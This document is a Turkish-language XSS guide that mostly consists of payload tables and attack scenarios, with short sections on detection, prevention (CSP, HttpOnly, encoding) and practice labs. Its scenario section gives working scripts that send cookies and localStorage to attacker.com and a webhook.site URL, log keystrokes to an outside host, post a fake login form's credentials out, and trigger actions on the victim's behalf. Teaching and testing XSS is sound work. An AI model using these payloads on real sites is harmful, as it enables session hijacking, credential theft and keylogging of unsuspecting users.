# XSS (Cross-Site Scripting) Rehberi (2025)

## 📑 İçerik
- [Giriş](#giris)
- [XSS Türleri](#xss-turleri)
- [Temel Payload'lar](#temel-payloadlar)
- [Eski / Çalışma İhtimali Düşük Payload'lar](#eski--calisma-ihtimali-dusuk-payloadlar)
- [WAF Bypass Payload'ları](#waf-bypass-payloadlari)
- [Tespit Yöntemleri](#tespit-yontemleri)
- [Önleme Yöntemleri](#onleme-yontemleri)
- [Test Ortamları](#test-ortamlari)
- [Kaynaklar](#kaynaklar)

---

## 🎯 Giriş
XSS (Cross-Site Scripting), web uygulamalarında sıkça karşılaşılan bir güvenlik açığıdır.  
Saldırganlar hedef kullanıcının tarayıcısında zararlı JavaScript kodu çalıştırarak:
- Oturum çalabilir
- Kullanıcıyı yönlendirebilir
- Keylogger veya phishing sayfa ekleyebilir

---

## 🧩 XSS Türleri
### 1. Stored XSS (Kalıcı XSS)
- Zararlı kod sunucuya/veritabanına kaydedilir.
- Kullanıcı her sayfayı açtığında çalışır.

### 2. Reflected XSS (Yansıtılmış XSS)
- Zararlı kod URL parametresinde gelir.
- Yanıtta direkt olarak çalışır.

### 3. DOM-Based XSS
- Açık tamamen tarayıcı tarafında, DOM manipülasyonu ile oluşur.
- Sunucuya istek gitmeden tetiklenir.

---

## 💻 Temel Payload'lar
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `<script>alert('XSS')</script>` | Basit alert ile XSS doğrulama | ✅ |
| `<img src=x onerror=alert('XSS')>` | Hatalı resim yükleme ile XSS | ✅ |
| `<svg/onload=alert('XSS')>` | SVG onload olayı | ✅ |
| `"><script>alert('XSS')</script>` | HTML injection sonrası XSS | ✅ |
| `<body onload=alert('XSS')>` | Body yüklenince tetikleme | ✅ |
| `<script>alert(document.cookie)</script>` | Cookie bilgisi görüntüleme | ⚠️ (HTTPOnly varsa çalışmaz) |
| `<script>alert(document.domain)</script>` | Domain görüntüleme | ✅ |
| `<script>fetch('https://attacker.com?c='+document.cookie)</script>` | Cookie dışarı gönderme | ⚠️ |
| `<script>document.location='https://attacker.com?c='+document.cookie</script>` | Yönlendirme ile çalma | ⚠️ |

---

## 🕰️ Eski / Çalışma İhtimali Düşük Payload'lar
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `<a href="javascript:alert('XSS')">Tıkla</a>` | javascript: URI ile XSS | ❌ |
| `<iframe src="javascript:alert('XSS')">` | iframe + javascript | ❌ |
| `<img src="javascript:alert('XSS')">` | Eski tarayıcılarda çalışır | ❌ |
| `<style>@import 'javascript:alert("XSS")';</style>` | CSS import ile XSS | ❌ |
| `<embed src="javascript:alert('XSS')">` | embed ile XSS | ❌ |
| `<object data="javascript:alert('XSS')">` | object ile XSS | ❌ |
| `document.domain='malicious.com';` | Domain değiştirme | ⚠️ (Aynı eTLD+1 içinde) |

---

## 🛡️ WAF Bypass Payload'ları
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `&#60;script&#62;alert(1)&#60;/script&#62;` | HTML entity encoding | ⚠️ |
| `<script>alert(String.fromCharCode(88,83,83))</script>` | ASCII kod ile | ⚠️ |
| `<script>eval('al'+'ert(1)')</script>` | Kod parçalama | ⚠️ |
| `<script>eval(atob('YWxlcnQoMSk='))</script>` | Base64 decode | ⚠️ |
| `<img src=1 onerror=alert(1)>` | Event handler kullanımı | ✅ |
| `<a href=# onmouseover=alert(1)>Hover</a>` | Mouse hover tetiklemesi | ✅ |

---

## 🔍 Tespit Yöntemleri
- Test payload’ları ile form alanlarını kontrol et.
- **OWASP ZAP**, **Burp Suite** gibi araçlarla tarama yap.
- Filtrelenmemiş kullanıcı girdisini HTML/JS çıktısında ara.
- DOM tabanlı XSS için kaynak kod analizi yap.

---
## 🚨 XSS ile Olası Saldırı Senaryoları

### 1. Cookie Çalma
```html
<script>
fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);
</script>

<script>
fetch('https://ctf-platform.com/catch?flag=' + document.cookie);
</script>
```
⚠️ Not: HTTPOnly cookie’ler JavaScript ile okunamaz.

---

### 2. LocalStorage / SessionStorage Çalma
```html
<script>
fetch('https://attacker.com/log?ls=' + JSON.stringify(localStorage));
</script>
```

---

### 3. CSRF Tetikleme
```html
<script>
fetch("https://hedefsite.com/transfer?amount=1000&to=attacker", {credentials: "include"});
</script>
```

---

### 4. Keylogger Yerleştirme
```html
<script>
document.addEventListener('keydown', e => {
  fetch('https://attacker.com/keys?key=' + e.key);
});
</script>
```

---

### 5. Phishing / Fake Login Form
```html
<form action="https://attacker.com/steal" method="POST">
  <input name="username" placeholder="Kullanıcı Adı">
  <input type="password" name="password" placeholder="Şifre">
  <input type="submit" value="Giriş">
</form>
```

---

### 6. Kullanıcı Yönlendirme
```html
<script>
window.location = "https://attacker.com";
</script>
```

---

### 7. Kurban Adına İşlem Yapma
```html
<script>
fetch('/api/sendMessage', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({msg: 'Merhaba!'}),
  headers: {'Content-Type': 'application/json'}
});
</script>
```



## 🛡️ Önleme Yöntemleri
1. **Girdi Doğrulama**
   - Whitelist yaklaşımı kullan.
2. **Çıktı Kodlama**
   - Context-based encoding (`<`, `>`, `&` vb.)
3. **HTTPOnly Cookie**
   - JavaScript erişimini engeller.
4. **Content Security Policy (CSP)**
   - Sadece belirli kaynaklardan script çalışmasına izin ver.
   - **Nonce/Hash Örneği:**
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-abc123'">
<script nonce="abc123">alert('Güvenli script')</script>
```
- DOMPurify gibi kütüphaneler ile HTML temizleme.

---

## 🧪 Test Ortamları
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
- [HackTheBox](https://www.hackthebox.com)
- [TryHackMe XSS Labs](https://tryhackme.com)

---

## 📚 Kaynaklar

### Resmi Belgeler
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)

### Payload Listeleri
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [SecLists - XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)
- [PayloadBox - XSS Payload List](https://github.com/payloadbox/xss-payload-list)
- [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)

### Araştırma Yazıları
- [pgaijin66/XSS-Payloads](https://github.com/pgaijin66/XSS-Payloads)
